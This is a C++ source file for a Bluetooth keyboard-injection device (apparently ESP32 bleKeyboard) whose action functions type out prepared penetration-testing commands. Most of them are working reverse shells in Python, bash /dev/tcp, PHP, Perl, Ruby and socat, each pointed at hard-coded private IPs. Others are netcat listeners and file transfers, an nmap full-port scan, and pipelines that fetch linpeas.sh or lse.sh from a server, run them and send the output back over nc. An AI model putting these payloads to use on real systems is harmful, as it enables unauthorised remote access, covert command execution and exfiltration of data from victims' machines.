/*
 * User actions you can modify these functions to do custom stuff.
 * Have a look at the 3 examples for some inspiration. Also, have a look
 * at Actions.h to see what actions you can use (eg. print, write, press, etc.)
 * 
 */

// After any action you might need a delay, this delay (in ms) is defined here:
#define USER_ACTION_DELAY 50

// Function used to print large pieces of text.
void printLargeString(const char string[]);

void userAction1(){

  // netcat listener on port 212
  printLargeString("nc -lvp 2112");
  
}

void userAction2(){

  // netcat client port 212
  printLargeString("nc -v $RHOST 2112");
 
}


void userAction3(){

  // netcat send file on port 2112 
  printLargeString("nc -w 3  $RHOST 2112 < file.name ");
 
}


void userAction4(){

  // netcat send file on port 2112 
  printLargeString("nc -l -p 2112   $RHOST > file.name ");
 
}

void userAction5(){

  // netcat send file on port 2112 
  printLargeString("rlwrap nc -v $RHOST 2112");
 
}


void userAction6(){

  // python reverse shell 
  // https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  printLargeString("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.3.1\",2112));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
  
  //delay(500);
  //printLargeString("https://youtu.be/dQw4w9WgXcQ");
  //bleKeyboard.write(KEY_RETURN);
  
}

//void userAction4(){

  // This function rickroll's you.

  //printLargeString("firefox https://www.youtube.com/watch?v=3TD08Z_jRrk &");
  //bleKeyboard.write(KEY_RETURN);
  //delay(1500);
  //printLargeString("k");
  //bleKeyboard.write(KEY_RETURN);
  
//}

//void userAction5(){

  // (Mac only) This opens a new file in Sublime (has to be installed off course and pastes the last thing you copied to the clipboard.
  // I use this to select pieces of text and copy them to a new file.
  //bleKeyboard.press(KEY_LEFT_CTRL);
  //bleKeyboard.press('c');
  //delay(100);
  //bleKeyboard.releaseAll();
  //printLargeString("clear");
  //bleKeyboard.write(KEY_RETURN);
  
//}

void userAction7(){
// bash rshell
printLargeString("bash -i >\& \/dev\/tcp\/192.168.3.55\/2112 0>\&1");
  
}

void userAction8(){
// php rshell
printLargeString("php -r '$sock=fsockopen(\"192.168.3.55\",2112);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
  
}

void userAction9(){

// perl rshell
printLargeString("perl -e 'use Socket;$i=\"192.168.3.55\";$p=2112;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
  
}




void userAction10(){
// php rshell
printLargeString("ruby -rsocket -e'f=TCPSocket.open(\"192.168.55\",2112).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");

/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}


void userAction11(){
// php rshell
printLargeString("python -c 'import pty; pty.spawn(\"/bin/bash\")'");

/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}




void userAction12(){
// php rshell
printLargeString("awk -F '.' '{print $1 \"\t\" $2 \"\t\"  $3}'  /etc/hosts");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}


void userAction13(){
// php rshell
printLargeString("sed 's/\./ /g' /etc/hosts");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}

void userAction14(){
// php rshell
printLargeString("find / -name '*.txt' -exec ls -la {} \\; 2>/dev/null");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}

void userAction15(){
// php rshell
printLargeString("cat /etc/hosts | tee foo.foo");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}

void userAction16(){
// php rshell
printLargeString("nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN full_tcp_nmap.txt -oX full_tcp_nmap.xml $RHOST ");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}


void userAction17(){
// php rshell
printLargeString("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}

void userAction18(){
// php rshell
printLargeString("socat file:`tty`,raw,echo=0 tcp-listen:2112");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}


void userAction19(){
// php rshell
printLargeString("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.3.55:2112");
/* A simple function to print large strings using bleKeyboard. The function has a delay
 * between keypresses to not miss any, or hang on 1.
*/

}

void userAction20(){

  // This loads reference page 

  printLargeString("firefox https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module &");
  bleKeyboard.write(KEY_RETURN);
  //delay(1500);
  //printLargeString("k");
  //bleKeyboard.write(KEY_RETURN);
  
}

void userAction21(){

  // This loads reference page 

  printLargeString("firefox https://user-images.githubusercontent.com/692396/70920933-3db99600-201b-11ea-8d4f-cbeade6626b7.png &");
  bleKeyboard.write(KEY_RETURN);
  //delay(1500);
  //printLargeString("k");
  //bleKeyboard.write(KEY_RETURN);
  
}

void userAction22(){

  // This loads reference page 

  printLargeString("wget http://$MYSERVER:5150/bin/tmux");
   
}

void userAction23(){

  // This loads reference page 

  printLargeString("wget -qO /dev/stdout http://$MYSERVER:5150/scripts/lse.sh | sh | nc $MYSERVER 3090 ");
  
}

void userAction24(){

  // This loads reference page 

  printLargeString("wget -qO /dev/stdout http://$MYSERVER:5150/scripts/linpeas.sh | sh | nc $MYSERVER 3090 ");
   
}



void userAction25(){

  // This loads reference page 

  printLargeString("nc -lvnp 3090 | tee changeme.out ");
  
 
}

void userAction26(){

  // This loads reference page 

  printLargeString("wget http://$MYSERVER:5150/bin/socat");
  
 
}
void printLargeString(const char string[]){

  for(int i=0; i < strlen(string); i++ ) {
    char c = string[i];
    bleKeyboard.print(c);
    delay(10); // 10ms is on most systems enough to not miss a character
  }
  
}
